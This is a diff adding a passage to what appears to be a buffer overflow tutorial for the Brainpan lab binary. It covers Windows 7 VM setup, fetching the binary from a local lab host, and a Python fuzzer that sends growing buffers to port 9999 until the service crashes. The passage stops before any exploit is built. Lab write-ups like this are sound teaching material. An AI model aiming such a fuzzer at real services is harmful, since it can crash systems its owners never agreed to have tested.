@@ -157,13 +157,63 @@ As the binary file is designed for windows, we will test it in a windown 7 machi
 
 [WINDOWS 7 OVA ](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
 
+The password will be "Passw0rd!"
+
 <br/>
 
 # VULNERABILITY BINARY ANALISYS
 
+First we start the windows machine. It has the IP 192.168.74.131.
 
+![placeholder](/assets/img/uploads/bufoverflow1/7.png "Large example image")
 
+Go to http://192.168.74.130:10000/bin/brainpan.exe to download the binary.
 
+![placeholder](/assets/img/uploads/bufoverflow1/6.png "Large example image")
+
+And we execute the binary and keep running it:
+
+![placeholder](/assets/img/uploads/bufoverflow1/8.png "Large example image")
+
+And check the conection with the attack machine:
+
+![placeholder](/assets/img/uploads/bufoverflow1/9.png "Large example image")
+
+Now we need to create a python script to test the input of the service:
+
+```python
+#!/usr/bin/python
+
+################################################
+# FUZZING A REMOTE INPUT PARAMETER IN A SOCKET #
+################################################
+# Try input sizes until the program crash      #
+################################################
+
+import sys
+import socket
+import time
+
+SIZE = 50
+IP = "192.168.74.131"
+PORT = 9999
+
+while(SIZE < 2000):
+    try:
+        print("\nSending input to buffer of ") % SIZE
+        inputBuffer = "A" * SIZE
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((IP, PORT))
+        s.send(inputBuffer)
+        s.close()
+        SIZE += 50
+        time.sleep(2)
+    except:
+        print("\nThe socket service crashes")
+        sys.exit()
+```
+
+At this point, we need to start the Inmunnity Debugger to study the behavior of the program.
 
 
 
